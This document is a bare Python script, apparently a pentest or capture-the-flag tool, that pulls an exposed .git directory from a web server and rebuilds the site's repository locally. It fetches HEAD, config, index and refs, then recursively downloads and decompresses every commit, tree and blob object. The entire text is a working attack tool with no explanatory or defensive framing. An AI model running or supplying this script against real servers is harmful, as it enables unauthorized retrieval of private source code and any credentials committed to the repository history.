import os, re, zlib, requests
from urllib.parse import urljoin

BASE = "http://0.0.0.0/.git/"
OUTDIR = "git_dump"

os.makedirs(OUTDIR, exist_ok=True)

def fetch(path):
    url = urljoin(BASE, path)
    r = requests.get(url)
    if r.ok:
        fpath = os.path.join(OUTDIR, path.replace("/", os.sep))
        os.makedirs(os.path.dirname(fpath), exist_ok=True)
        with open(fpath, "wb") as f:
            f.write(r.content)
        print("[+] Saved", path)
        return r.content
    return None

for p in ["HEAD", "config", "description", "index",
          "refs/heads/master", "refs/remotes/origin/HEAD"]:
    fetch(p)

head = open(os.path.join(OUTDIR, "HEAD"), "r").read().strip()
if head.startswith("ref:"):
    ref = head.split(" ",1)[1]
    commit_hash = open(os.path.join(OUTDIR, ref.replace("/", os.sep)), "r").read().strip()
else:
    commit_hash = head
print("[*] Commit =", commit_hash)

def get_object(sha1):
    path = f"objects/{sha1[:2]}/{sha1[2:]}"
    raw = fetch(path)
    if not raw: return None
    return zlib.decompress(raw)

seen = set()
def dump_commit(sha1):
    if sha1 in seen: return
    seen.add(sha1)
    data = get_object(sha1)
    if not data: return
    header, body = data.split(b"\x00",1)
    if header.startswith(b"commit"):
        m = re.search(br"tree ([0-9a-f]{40})", body)
        if m: dump_tree(m.group(1).decode())
        for parent in re.findall(br"parent ([0-9a-f]{40})", body):
            dump_commit(parent.decode())
    elif header.startswith(b"tree"):
        dump_tree(sha1)
    elif header.startswith(b"blob"):
        fname = os.path.join(OUTDIR, "blobs", sha1)
        os.makedirs(os.path.dirname(fname), exist_ok=True)
        with open(fname,"wb") as f: f.write(body)
        print("    [blob]", sha1, "-> saved")

def dump_tree(sha1):
    data = get_object(sha1)
    if not data: return
    header, body = data.split(b"\x00",1)
    i=0
    while i < len(body):
        j = body.find(b" ", i)
        mode = body[i:j]
        k = body.find(b"\x00", j)
        name = body[j+1:k].decode()
        sha1_bytes = body[k+1:k+21]
        sha1_hex = sha1_bytes.hex()
        print(" [tree]", name, sha1_hex)
        if mode.startswith(b"40"):
            dump_tree(sha1_hex)
        else:
            dump_commit(sha1_hex)
        i = k+21

dump_commit(commit_hash)

print("\n[*] Done. All blobs saved in git_dump/blobs/")
